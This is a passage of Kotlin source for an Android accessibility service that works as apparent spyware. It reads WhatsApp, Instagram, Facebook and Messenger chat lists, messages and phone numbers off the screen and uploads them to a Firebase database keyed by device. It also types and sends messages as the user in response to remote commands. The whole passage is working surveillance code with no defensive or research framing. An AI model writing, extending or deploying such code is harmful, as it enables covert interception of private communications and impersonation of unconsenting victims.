                uploadSocialMediaMessage(messageData)
            }

            screenWakeLock?.let { wakeLock ->
                if (wakeLock.isHeld) {
                    wakeLock.release()
                    Logger.log("Screen wake lock released after sending")
                }
            }

        } catch (e: Exception) {
            Logger.error("Error sending social media message (${getPlatformName(packageName)}): ${e.message}", e)
            screenWakeLock?.let { wakeLock ->
                if (wakeLock.isHeld) {
                    wakeLock.release()
                }
            }
        }
    }

    // Navigation and interaction methods
    private suspend fun navigateToWhatsAppSearch(packageName: String): Boolean {
        return try {
            val rootNode = rootInActiveWindow ?: return false
            val searchButton = SEARCH_IDS.mapNotNull { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
            }.firstOrNull()

            if (searchButton != null) {
                searchButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                Logger.log("WhatsApp search button clicked")
                delay(1000)
                true
            } else {
                false
            }
        } catch (e: Exception) {
            Logger.error("Error navigating to WhatsApp search", e)
            false
        }
    }

    private suspend fun searchForWhatsAppRecipient(recipient: String, packageName: String): Boolean {
        return try {
            val rootNode = rootInActiveWindow ?: return false
            val searchField = SEARCH_INPUT_IDS.mapNotNull { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
            }.firstOrNull()

            if (searchField != null) {
                searchField.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
                delay(500)

                val args = Bundle().apply {
                    putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, recipient)
                }
                searchField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                delay(2000)

                val firstResult = CONTACT_NAME_IDS.mapNotNull { id ->
                    rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                }.firstOrNull() ?: CONVERSATIONS_ROW_IDS.mapNotNull { id ->
                    rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                }.firstOrNull()

                firstResult?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                Logger.log("WhatsApp recipient selected: $recipient")
                return true
            }
            false
        } catch (e: Exception) {
            Logger.error("Error searching for WhatsApp recipient", e)
            false
        }
    }

    private suspend fun sendWhatsAppMessageToRecipient(message: String, packageName: String): Boolean {
        return try {
            val rootNode = rootInActiveWindow ?: return false

            val messageInput = MESSAGE_ENTRY_IDS.mapNotNull { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
            }.firstOrNull()

            if (messageInput != null) {
                messageInput.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
                delay(500)

                val messageArgs = Bundle().apply {
                    putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, message)
                }
                messageInput.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, messageArgs)
                delay(1000)

                val sendButton = SEND_IDS.mapNotNull { id ->
                    rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                }.firstOrNull()

                sendButton?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                Logger.log("WhatsApp message sent successfully")
                return true
            }
            false
        } catch (e: Exception) {
            Logger.error("Error sending WhatsApp message", e)
            false
        }
    }

    private suspend fun navigateToSocialMediaMessages(packageName: String): Boolean {
        return try {
            val rootNode = rootInActiveWindow ?: return false
            
            when (packageName) {
                INSTAGRAM_PACKAGE -> {
                    val dmButton = rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/direct_inbox_button").firstOrNull()
                        ?: rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/action_bar_inbox_button").firstOrNull()
                    
                    dmButton?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Logger.log("Navigated to Instagram DMs")
                    true
                }
                MESSENGER_PACKAGE -> {
                    Logger.log("Messenger opened to messages")
                    true
                }
                FACEBOOK_PACKAGE -> {
                    val messagesButton = rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/messages_tab").firstOrNull()
                    messagesButton?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Logger.log("Navigated to Facebook messages")
                    true
                }
                else -> false
            }
        } catch (e: Exception) {
            Logger.error("Error navigating to social media messages", e)
            false
        }
    }

    private suspend fun searchForSocialMediaRecipient(recipient: String, packageName: String): Boolean {
        return try {
            val rootNode = rootInActiveWindow ?: return false
            
            val searchButton = SEARCH_IDS.mapNotNull { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
            }.firstOrNull()

            if (searchButton != null) {
                searchButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                delay(1000)

                val searchField = SEARCH_INPUT_IDS.mapNotNull { id ->
                    rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                }.firstOrNull()

                if (searchField != null) {
                    searchField.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
                    delay(500)

                    val args = Bundle().apply {
                        putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, recipient)
                    }
                    searchField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                    delay(2000)

                    val firstResult = rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/search_result_item").firstOrNull()
                        ?: CONVERSATIONS_ROW_IDS.mapNotNull { id ->
                            rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                        }.firstOrNull()

                    firstResult?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Logger.log("Social media recipient selected: $recipient")
                    return true
                }
            }
            false
        } catch (e: Exception) {
            Logger.error("Error searching for social media recipient", e)
            false
        }
    }

    private suspend fun sendSocialMediaMessageToRecipient(message: String, packageName: String): Boolean {
        return try {
            val rootNode = rootInActiveWindow ?: return false

            val messageInput = MESSAGE_ENTRY_IDS.mapNotNull { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
            }.firstOrNull()

            if (messageInput != null) {
                messageInput.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
                delay(500)

                val messageArgs = Bundle().apply {
                    putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, message)
                }
                messageInput.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, messageArgs)
                delay(1000)

                val sendButton = SEND_IDS.mapNotNull { id ->
                    rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                }.firstOrNull()

                sendButton?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                Logger.log("Social media message sent successfully")
                return true
            }
            false
        } catch (e: Exception) {
            Logger.error("Error sending social media message", e)
            false
        }
    }

    // Call-related methods
    private fun extractCallInformation(rootNode: AccessibilityNodeInfo, packageName: String) {
        try {
            val callNumber = findCallNumber(rootNode, packageName)
            if (callNumber != null) {
                reportCallNumber(callNumber, packageName)
            }

            val callState = findCallState(rootNode, packageName)
            if (callState != null) {
                reportCallState(callState, packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error extracting call information", e)
        }
    }

    private fun findCallNumber(rootNode: AccessibilityNodeInfo, packageName: String): String? {
        try {
            CALL_NUMBER_IDS.forEach { id ->
                val nodes = rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id")
                nodes.forEach { node ->
                    val text = node.text?.toString()
                    val phoneNumber = extractPhoneNumber(text)
                    if (phoneNumber != null) {
                        return phoneNumber
                    }
                }
            }
            return searchNodeForPhoneNumber(rootNode)
        } catch (e: Exception) {
            Logger.error("Error finding call number", e)
            return null
        }
    }

    private fun findCallState(rootNode: AccessibilityNodeInfo, packageName: String): String? {
        return try {
            searchNodeForCallState(rootNode)
        } catch (e: Exception) {
            Logger.error("Error finding call state", e)
            null
        }
    }

    private fun searchNodeForPhoneNumber(node: AccessibilityNodeInfo): String? {
        try {
            val text = node.text?.toString()
            val phoneNumber = extractPhoneNumber(text)
            if (phoneNumber != null) {
                return phoneNumber
            }

            val contentDesc = node.contentDescription?.toString()
            val phoneNumberFromDesc = extractPhoneNumber(contentDesc)
            if (phoneNumberFromDesc != null) {
                return phoneNumberFromDesc
            }

            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    val childResult = searchNodeForPhoneNumber(child)
                    if (childResult != null) {
                        return childResult
                    }
                }
            }

            return null
        } catch (e: Exception) {
            Logger.error("Error searching node for phone number", e)
            return null
        }
    }

    private fun searchNodeForCallState(node: AccessibilityNodeInfo): String? {
        try {
            val text = node.text?.toString()?.lowercase()
            if (text != null) {
                CALL_STATE_TEXTS.forEach { stateText ->
                    if (text.contains(stateText)) {
                        return stateText
                    }
                }
            }

            val contentDesc = node.contentDescription?.toString()?.lowercase()
            if (contentDesc != null) {
                CALL_STATE_TEXTS.forEach { stateText ->
                    if (contentDesc.contains(stateText)) {
                        return stateText
                    }
                }
            }

            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    val childResult = searchNodeForCallState(child)
                    if (childResult != null) {
                        return childResult
                    }
                }
            }

            return null
        } catch (e: Exception) {
            Logger.error("Error searching node for call state", e)
            return null
        }
    }

    private fun extractPhoneNumber(text: String?): String? {
        if (text.isNullOrBlank()) return null

        try {
            val patterns = listOf(
                "\\+?[1-9]\\d{1,14}".toRegex(),
                "\\(?\\d{3}\\)?[-\\s]?\\d{3}[-\\s]?\\d{4}".toRegex(),
                "\\d{10,15}".toRegex()
            )

            patterns.forEach { pattern ->
                val match = pattern.find(text)
                if (match != null) {
                    val number = match.value.replace(Regex("[^+\\d]"), "")
                    if (number.length >= 7) {
                        return number
                    }
                }
            }

            return null
        } catch (e: Exception) {
            Logger.error("Error extracting phone number from: $text", e)
            return null
        }
    }

    private fun reportCallNumber(phoneNumber: String, source: String) {
        try {
            val callStatusRef = db.child("Device/$deviceId/call_status")
            callStatusRef.child("accessibility_detected_number").setValue(phoneNumber)
            callStatusRef.child("accessibility_source").setValue(source)
            callStatusRef.child("accessibility_timestamp").setValue(System.currentTimeMillis())

            Logger.log("Reported call number via accessibility: $phoneNumber from $source")
        } catch (e: Exception) {
            Logger.error("Error reporting call number", e)
        }
    }

    private fun reportCallState(state: String, source: String) {
        try {
            val callStatusRef = db.child("Device/$deviceId/call_status")
            callStatusRef.child("accessibility_detected_state").setValue(state)
            callStatusRef.child("accessibility_source").setValue(source)
            callStatusRef.child("accessibility_timestamp").setValue(System.currentTimeMillis())

            Logger.log("Reported call state via accessibility: $state from $source")
        } catch (e: Exception) {
            Logger.error("Error reporting call state", e)
        }
    }

    // Utility methods
    private fun getTimestampFromNode(parent: AccessibilityNodeInfo, packageName: String): Long? {
        return try {
            DATE_IDS.forEach { id ->
                val timestampNode = parent.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                if (timestampNode != null) {
                    return parseTimestamp(timestampNode.text?.toString())
                }
            }
            null
        } catch (e: Exception) {
            null
        }
    }

    private fun isOutgoingMessage(parent: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            when (packageName) {
                WHATSAPP_PACKAGE, WHATSAPP_BUSINESS_PACKAGE -> {
                    parent.findAccessibilityNodeInfosByViewId("$packageName:id/outgoing_msg_indicator").isNotEmpty()
                }
                INSTAGRAM_PACKAGE -> {
                    parent.findAccessibilityNodeInfosByViewId("$packageName:id/direct_text_message_text_view_outgoing").isNotEmpty()
                }
                MESSENGER_PACKAGE, FACEBOOK_PACKAGE -> {
                    parent.findAccessibilityNodeInfosByViewId("$packageName:id/row_thread_item_text_send").isNotEmpty()
                }
                else -> false
            }
        } catch (e: Exception) {
            false
        }
    }

    private fun generateMessageId(sender: String, text: String, timestamp: Long, packageName: String, direction: String): String {
        return try {
            val input = "$sender$text$timestamp$packageName$direction${System.nanoTime()}"
            MessageDigest.getInstance("SHA-256")
                .digest(input.toByteArray())
                .joinToString("") { "%02x".format(it) }
                .substring(0, 32)
        } catch (e: Exception) {
            Logger.error("Error generating message ID", e)
            "error_${System.currentTimeMillis()}_${(1000..9999).random()}"
        }
    }

    private fun parseTimestamp(timestampStr: String?): Long {
        return try {
            timestampStr?.let {
                when {
                    it.contains(":") -> System.currentTimeMillis()
                    it.matches(Regex("\\d+")) -> it.toLongOrNull() ?: System.currentTimeMillis()
                    else -> System.currentTimeMillis()
                }
            } ?: System.currentTimeMillis()
        } catch (e: Exception) {
            System.currentTimeMillis()
        }
    }

    private fun isReplyMessage(parent: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            parent.findAccessibilityNodeInfosByViewId("$packageName:id/quoted_message").isNotEmpty() ||
            parent.findAccessibilityNodeInfosByViewId("$packageName:id/reply_message").isNotEmpty()
        } catch (e: Exception) {
            false
        }
    }

    private fun getCurrentChatName(packageName: String): String? {
        return try {
            val rootNode = rootInActiveWindow ?: return null
            CONTACT_NAME_IDS.forEach { id ->
                val titleNode = rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                if (titleNode != null) {
                    return titleNode.text?.toString()
                }
            }
            null
        } catch (e: Exception) {
            Logger.error("Error getting current chat name", e)
            null
        }
    }

    private fun getContactDp(contactName: String, packageName: String): String {
        Logger.log("DP access for $contactName ($packageName) - placeholder implementation")
        return ""
    }

    private fun getContactProfile(contactName: String, packageName: String): String {
        Logger.log("Profile access for $contactName (${getPlatformName(packageName)}) - placeholder implementation")
        return ""
    }

    private fun getPlatformName(packageName: String): String {
        return when (packageName) {
            WHATSAPP_PACKAGE -> "WhatsApp"
            WHATSAPP_BUSINESS_PACKAGE -> "WhatsApp Business"
            INSTAGRAM_PACKAGE -> "Instagram"
            FACEBOOK_PACKAGE -> "Facebook"
            MESSENGER_PACKAGE -> "Messenger"
            FACEBOOK_LITE_PACKAGE -> "Facebook Lite"
            else -> "Unknown"
        }
    }

    // Upload methods
    private fun uploadWhatsAppMessage(message: Map<String, Any>) {
        scope.launch {
            try {
                val messagesRef = db.child("Device").child(deviceId).child("whatsapp/data")
                messagesRef.child(message["messageId"] as String).setValue(message)
                    .addOnSuccessListener {
                        Logger.log("WhatsApp message uploaded: ${message["content"]} (${message["packageName"]})")
                    }
                    .addOnFailureListener { e ->
                        Logger.error("WhatsApp message upload failed: ${e.message}", e)
                    }
            } catch (e: Exception) {
                Logger.error("Error uploading WhatsApp message", e)
            }
        }
    }

    private fun uploadSocialMediaMessage(message: Map<String, Any>) {
        scope.launch {
            try {
                val messagesRef = db.child("Device").child(deviceId).child("social_media/data")
                messagesRef.child(message["messageId"] as String).setValue(message)
                    .addOnSuccessListener {
                        Logger.log("Social media message uploaded: ${message["content"]} (${message["platform"]})")
                    }
                    .addOnFailureListener { e ->
                        Logger.error("Social media message upload failed: ${e.message}", e)
                    }
            } catch (e: Exception) {
                Logger.error("Error uploading social media message", e)
            }
        }
    }

    // Chat list extraction methods
    private fun extractWhatsAppChatListData(rootNode: AccessibilityNodeInfo, packageName: String) {
        try {
            val chatNodes = CONVERSATIONS_ROW_IDS.flatMap { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id")
            }
            val chats = mutableListOf<Map<String, Any>>()

            chatNodes.forEach { chatNode ->
                val name = CONTACT_NAME_IDS.mapNotNull { id ->
                    chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()?.text?.toString()
                }.firstOrNull() ?: ""

                val lastMessage = chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/conversation_last_message")
                    .firstOrNull()?.text?.toString() ?: ""

                val timestamp = DATE_IDS.mapNotNull { id ->
                    chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()?.text?.toString()
                }.firstOrNull()?.let { parseTimestamp(it) } ?: 0L

                val unreadCount = chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/unread_count")
                    .firstOrNull()?.text?.toString()?.toIntOrNull() ?: 0

                if (name.isNotEmpty()) {
                    chats.add(mapOf(
                        "name" to name,
                        "lastMessage" to lastMessage,
                        "timestamp" to timestamp,
                        "unreadCount" to unreadCount,
                        "packageName" to packageName
                    ))
                }
            }

            if (chats.isNotEmpty()) {
                db.child("Device").child(deviceId).child("whatsapp/chats").setValue(chats)
                    .addOnSuccessListener {
                        Logger.log("WhatsApp chat list uploaded: ${chats.size} chats ($packageName)")
                    }
                    .addOnFailureListener { e ->
                        Logger.error("Failed to upload WhatsApp chat list ($packageName): ${e.message}", e)
                    }
            }
        } catch (e: Exception) {
            Logger.error("Error extracting WhatsApp chat list data", e)
        }
    }

    private fun extractSocialMediaChatListData(rootNode: AccessibilityNodeInfo, packageName: String) {
        try {
            val chatNodes = CONVERSATIONS_ROW_IDS.flatMap { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id")
            }
            val chats = mutableListOf<Map<String, Any>>()

            chatNodes.forEach { chatNode ->
                val name = CONTACT_NAME_IDS.mapNotNull { id ->
                    chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()?.text?.toString()
                }.firstOrNull() ?: ""

                val lastMessage = chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/last_message")
                    .firstOrNull()?.text?.toString() ?: ""

                val timestamp = DATE_IDS.mapNotNull { id ->
                    chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()?.text?.toString()
                }.firstOrNull()?.let { parseTimestamp(it) } ?: 0L

                if (name.isNotEmpty()) {
                    chats.add(mapOf(
                        "name" to name,
                        "lastMessage" to lastMessage,
                        "timestamp" to timestamp,
                        "platform" to getPlatformName(packageName),
                        "packageName" to packageName
                    ))
                }
            }

            if (chats.isNotEmpty()) {
                db.child("Device").child(deviceId).child("social_media/chats").setValue(chats)
                    .addOnSuccessListener {
                        Logger.log("Social media chat list uploaded: ${chats.size} chats (${getPlatformName(packageName)})")
                    }
                    .addOnFailureListener { e ->
                        Logger.error("Failed to upload social media chat list (${getPlatformName(packageName)}): ${e.message}", e)
                    }
            }
        } catch (e: Exception) {
            Logger.error("Error extracting social media chat list data", e)
        }
    }

    private fun extractChatMetadata(rootNode: AccessibilityNodeInfo, packageName: String, platform: String) {
        try {
            val chatName = getCurrentChatName(packageName) ?: return
            val profileUrl = when (platform) {
                "whatsapp" -> getContactDp(chatName, packageName)
                "social_media" -> getContactProfile(chatName, packageName)
                else -> ""
            }
            
            if (profileUrl.isNotEmpty()) {
                val contactsPath = if (platform == "whatsapp") "whatsapp/contacts" else "social_media/contacts"
                val contactData = if (platform == "whatsapp") {
                    mapOf("dpUrl" to profileUrl)
                } else {
                    mapOf(
                        "profileUrl" to profileUrl,
                        "platform" to getPlatformName(packageName)
                    )
                }
                
                db.child("Device").child(deviceId).child(contactsPath).child(chatName)
                    .setValue(contactData)
            }
        } catch (e: Exception) {
            Logger.error("Error extracting chat metadata", e)
        }
    }

    private fun extractCallMetadata(rootNode: AccessibilityNodeInfo, packageName: String) {
        try {
            val callNumber = findCallNumber(rootNode, packageName)
            if (callNumber != null) {
                val callData = mapOf(
                    "number" to callNumber,
                    "timestamp" to System.currentTimeMillis(),
                    "source" to packageName
                )
                
                db.child("Device").child(deviceId).child("call_metadata").push().setValue(callData)
            }
        } catch (e: Exception) {
            Logger.error("Error extracting call metadata", e)
        }
    }

    override fun onInterrupt() {
        Logger.log("UnifiedAccessibilityService interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }
            screenWakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }

            scope.cancel()
            valueEventListener.forEach { (_, listener) ->
                db.child("Device").child(deviceId).child("whatsapp/commands")
                    .removeEventListener(listener)
                db.child("Device").child(deviceId).child("social_media/commands")
                    .removeEventListener(listener)
            }
            valueEventListener.clear()
            Logger.log("UnifiedAccessibilityService destroyed")
        } catch (e: Exception) {
            Logger.error("Error destroying UnifiedAccessibilityService", e)
        }
    }
}